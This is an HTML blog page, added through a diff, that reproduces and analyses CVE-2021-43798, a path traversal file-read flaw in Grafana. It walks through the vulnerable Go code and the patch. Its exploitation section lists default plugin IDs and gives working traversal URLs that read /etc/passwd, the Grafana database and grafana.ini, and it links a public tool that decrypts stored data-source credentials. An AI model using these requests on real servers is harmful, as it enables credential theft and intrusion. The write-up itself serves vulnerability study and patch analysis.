@@ -1,0 +1,474 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Grafana 任意文件读取漏洞复现分析 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Grafana 任意文件读取漏洞复现分析
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-02 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/pe3-Tsqw7/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="grafana-任意文件读取漏洞复现分析">Grafana 任意文件读取漏洞复现分析</h1>
+<p><strong>CVE-2021-43798</strong></p>
+<h2 id="0x01-前言">0x01 前言</h2>
+<h3 id="概述">概述</h3>
+<p><code>Grafana</code>是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。</p>
+<h3 id="影响范围">影响范围</h3>
+<pre><code class="language-Bash">Grafana 8.0.0-beta1 - 8.3.0
+</code></pre>
+<h3 id="安全版本">安全版本</h3>
+<pre><code class="language-Bash">Grafana &gt;= 8.3.1  
+Grafana &gt;= 8.2.7  
+Grafana &gt;= 8.1.8  
+Grafana &gt;= 8.0.7
+</code></pre>
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<p><code>docker</code>直接拉取官方镜像https://hub.docker.com/r/grafana/grafana/tags</p>
+<pre><code class="language-bash">sudo docker pull grafana/grafana:8.3.0-ubuntu
+</code></pre>
+<p>开启容器</p>
+<pre><code class="language-bash">sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana:8.3.0-ubuntu
+</code></pre>
+<p>访问虚拟机</p>
+<pre><code>http://192.168.159.132:3000/
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/bcaaffa4a03b4eef834eb0e734972ac0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h2 id="0x03漏洞分析"><strong>0x03漏洞分析</strong></h2>
+<p>github上8.3.1修复了这个漏洞，那么直接查看两者比较即可</p>
+<p>可以看到是更改了 <a href="https://github.com/grafana/grafana/commit/00e38ba555cfb120361c9623de3285d70c60172f#diff-2e51080c3987968b4ea97b2aa6747caced5777413ba75deca2efdcc185cc2b12">pkg/api/plugins.go</a> 文件</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/0f89c4e986a048438655384a38d76b1d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>下载8.3.0源码，定位到284行也就是getPluginAssets函数</p>
+<pre><code class="language-go">func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {
+	pluginID := web.Params(c.Req)[&quot;:pluginId&quot;]
+	plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)
+	if !exists {
+		c.JsonApiErr(404, &quot;Plugin not found&quot;, nil)
+		return
+	}
+
+	requestedFile := filepath.Clean(web.Params(c.Req)[&quot;*&quot;])
+	pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
+
+	if !plugin.IncludedInSignature(requestedFile) {
+		hs.log.Warn(&quot;Access to requested plugin file will be forbidden in upcoming Grafana versions as the file &quot;+
+			&quot;is not included in the plugin signature&quot;, &quot;file&quot;, requestedFile)
+	}
+
+	// It's safe to ignore gosec warning G304 since we already clean the requested file path and subsequently
+	// use this with a prefix of the plugin's directory, which is set during plugin loading
+	// nolint:gosec
+	f, err := os.Open(pluginFilePath)
+	if err != nil {
+		if os.IsNotExist(err) {
+			c.JsonApiErr(404, &quot;Plugin file not found&quot;, err)
+			return
+		}
+		c.JsonApiErr(500, &quot;Could not open plugin file&quot;, err)
+		return
+	}
+	defer func() {
+		if err := f.Close(); err != nil {
+			hs.log.Error(&quot;Failed to close file&quot;, &quot;err&quot;, err)
+		}
+	}()
+
+	fi, err := f.Stat()
+	if err != nil {
+		c.JsonApiErr(500, &quot;Plugin file exists but could not open&quot;, err)
+		return
+	}
+
+	if hs.Cfg.Env == setting.Dev {
+		c.Resp.Header().Set(&quot;Cache-Control&quot;, &quot;max-age=0, must-revalidate, no-cache&quot;)
+	} else {
+		c.Resp.Header().Set(&quot;Cache-Control&quot;, &quot;public, max-age=3600&quot;)
+	}
+
+	http.ServeContent(c.Resp, c.Req, pluginFilePath, fi.ModTime(), f)
+}
+</code></pre>
+<p>刚开始拿到请求中的插件信息进行判断，插件是否存在，不存在就报错</p>
+<pre><code>Plugin not found
+</code></pre>
+<p>存在的话就接下去执行到关键点</p>
+<pre><code>requestedFile := filepath.Clean(web.Params(c.Req)[&quot;*&quot;])
+</code></pre>
+<p>使用 filepath.Clean对请求进行清理，而Clean作用是这样的</p>
+<p>此函数迭代地应用以下规则，直到无法进行进一步处理为止：</p>
+<ul>
+<li>它用一个替换多个Separator元素。</li>
+<li>如果指定的路径为空字符串，则返回字符串“.”。</li>
+<li>它消除了每个。路径名元素(当前目录)。</li>
+<li>它消除了每个内部..路径名元素(父目录)以及在其前面的non ..元素。</li>
+<li>它消除了..元素开始于根路径：即，在分隔符为“ /”的情况下，在路径的开头用“/”替换“/..”。</li>
+</ul>
+<p>**返回值：**通过纯词法处理，它返回与指定路径等效的最短路径名。</p>
+<p><strong>范例1：</strong></p>
+<pre><code>package main 
+  
+import ( 
+    &quot;fmt&quot;
+    &quot;path/filepath&quot;
+) 
+  
+// Calling main 
+func main() { 
+  
+    // Calling the Clean() function 
+    fmt.Println(filepath.Clean(&quot;/GFG/./../Geeks&quot;)) 
+    fmt.Println(filepath.Clean(&quot;GFG/../Geeks&quot;)) 
+    fmt.Println(filepath.Clean(&quot;..GFG/./../Geeks&quot;)) 
+    fmt.Println(filepath.Clean(&quot;gfg/../../../Geek/GFG&quot;)) 
+}
+</code></pre>
+<p><strong>输出：</strong></p>
+<pre><code>/Geeks
+Geeks
+Geeks
+../../Geek/GFG
+</code></pre>
+<p>可以看出他对../是没有进行过滤处理的，也就导致了任意目录穿越</p>
+<p>当我们传入类似于<code>../../../etc/pass</code>的路径时，就会被拼接到<code>pluginFilePath</code>参数中</p>
+<p>然后在下面通过Open去成功读取文件内容</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/643fbdeb508f4b0da81075076e2c768c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>路径溯源</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/414e737ceb33423f85f8c196746809ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<pre><code>r.Get(&quot;/public/plugins/:pluginId/*&quot;, hs.getPluginAssets)
+</code></pre>
+<p>直接在api.go中使用了<code>r.Get()</code>并没有做身份认证（贴心的备注了身份认证的注释，不在当中）。</p>
+<p>所以只要知道一个存在的pluginId，然后调用<code>/public/plugins/:pluginId/*</code>就可以访问任意文件，比如<code>/public/plugins/:pluginId/../../../../../etc/passwd</code>。</p>
+<h2 id="0x04补丁分析">0x04补丁分析</h2>
+<p>在8.3.0和8.3.1对比中可以看到新加了一段代码</p>
+<pre><code class="language-go">requestedFile := filepath.Clean(filepath.Join(&quot;/&quot;, web.Params(c.Req)[&quot;*&quot;]))
+	rel, err := filepath.Rel(&quot;/&quot;, requestedFile)
+	if err != nil {
+		// this should not never fail
+		c.JsonApiErr(500, &quot;Relative path found&quot;, err)
+		return
+	}
+</code></pre>
+<p>主要在 filepath.Rel函数</p>
+<p><strong>用法:</strong></p>
+<pre><code>func Rel(basepath, targpath string) (string, error)
+</code></pre>
+<p>当使用中间分隔符将其连接到basepath时，Rel返回一个相对路径，该相对路径在词法上等效于targpath。</p>
+<p>也就是说，Join(basepath，Rel(basepath，targpath))等同于targpath本身。</p>
+<p>成功后，即使basepath和targpath不共享任何元素，返回的路径也始终相对于basepath。</p>
+<p>如果无法相对于基本路径创建targpath，或者如果需要知道当前工作目录以进行计算，则会返回错误。 Rel在结果上调用Clean。</p>
+<p>示例</p>
+<pre><code class="language-go">package main
+
+import (
+    &quot;fmt&quot;
+    &quot;path/filepath&quot;
+)
+
+func main() {
+    paths := []string{
+        &quot;./a/b/c&quot;,
+        &quot;/b/c&quot;,
+        &quot;/../b/c&quot;,
+    }
+    base := &quot;/&quot;
+    fmt.Println(&quot;On Unix:&quot;)
+    for _, p := range paths {
+        rel, err := filepath.Rel(base, p)
+        fmt.Printf(&quot;%q: %q %v\n&quot;, p, rel, err)
+    }
+}
+</code></pre>
+<p>输出</p>
+<pre><code class="language-go">On Unix:
+&quot;./a/b/c&quot;: &quot;&quot; Rel: can't make ./a/b/c relative to /
+&quot;/b/c&quot;: &quot;b/c&quot; &lt;nil&gt;
+&quot;/../b/c&quot;: &quot;b/c&quot; &lt;nil&gt;
+</code></pre>
+<p>这样我们就无法实现路径穿越了</p>
+<h2 id="0x05漏洞利用">0x05漏洞利用</h2>
+<p>要利用此漏洞，就要先找到安装的插件,常用的插件列表，经过测试全部是默认开启的（可能docker环境不同）</p>
+<pre><code>alertmanager
+grafana
+loki
+postgres
+grafana-azure-monitor-datasource
+mixed
+prometheus
+cloudwatch
+graphite
+mssql
+tempo
+dashboard
+influxdb
+mysql
+testdata
+elasticsearch
+jaeger
+opentsdb
+zipkin
+alertGroups
+bargauge
+debug
+graph
+live
+piechart
+status-history
+timeseries
+alertlist
+candlestick
+gauge
+heatmap
+logs
+pluginlist
+table
+welcome
+annolist
+canvas
+geomap
+histogram
+news
+stat
+table-old
+xychart
+barchart
+dashlist
+gettingstarted
+icon
+nodeGraph
+state-timeline
+text
+</code></pre>
+<h3 id="读取linux固定文件">读取linux固定文件</h3>
+<pre><code>/public/plugins/alertmanager/../../../../../../../../etc/passwd
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/e9e0e256f1684d7aaf29e0ae83567121.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h3 id="读取grafana数据库文件">读取grafana数据库文件</h3>
+<pre><code>/public/plugins/alertmanager/../../../../../../../../var/lib/grafana/grafana.db
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/2499fd0aa7b346fea05ac583a2f8bd43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>但是password是带salt的，所以不好破解</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/608378bf7ab44d8dba0e4b6a47e4bc9e.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>但是能获取到一些敏感信息，如user_auth_token表中的访问ip</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/ce3f58074d3e4f5e8cc46ca71aeeb26e.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>data_source表中的数据库信息</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/71b705b5d6b74127a0a775174a18aa80.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>其中密码也是加密存储的</p>
+<pre><code>{&quot;password&quot;:&quot;M3NybDZNRG3C74ufA1oFVaLzieBN7pJAPJpuC0P2&quot;}
+</code></pre>
+<p>而加密方法是cfb模式下的AES256，秘钥存储在配置文件中</p>
+<h3 id="读取配置文件">读取配置文件</h3>
+<pre><code>/public/plugins/alertmanager/../../../../../../../../etc/grafana/grafana.ini
+</code></pre>
+<p>搜索secret_key</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/e05539a8e0e14917bc0f68033a88a2bc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<pre><code>SW2YcwTIb9zpOOhoPsMm
+</code></pre>
+<p>这里就不去手动解密了</p>
+<p>直接使用师傅已经写好的工具，原理也是自动探测是否有漏洞、存在的plugin、提取密钥、解密server端db文件，并输出<code>data_sourrce</code>信息。</p>
+<pre><code>https://github.com/A-D-Team/grafanaExp
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/9ffe2a83fdfd47d5a6508aebb665892e.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>可以得到自己刚刚创建的数据源的所有信息</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/thinkphp51x-fan-xu-lie-hua-lou-dong-fu-xian-yu-fen-xi/" class="post-title gt-a-link">
+                    thinkphp5.1.x反序列化漏洞复现与分析
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/grafana-ren-yi-wen-jian-du-qu-lou-dong-fu-xian-fen-xi/" class="leancloud_visitors" data-flag-title="Grafana 任意文件读取漏洞复现分析">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
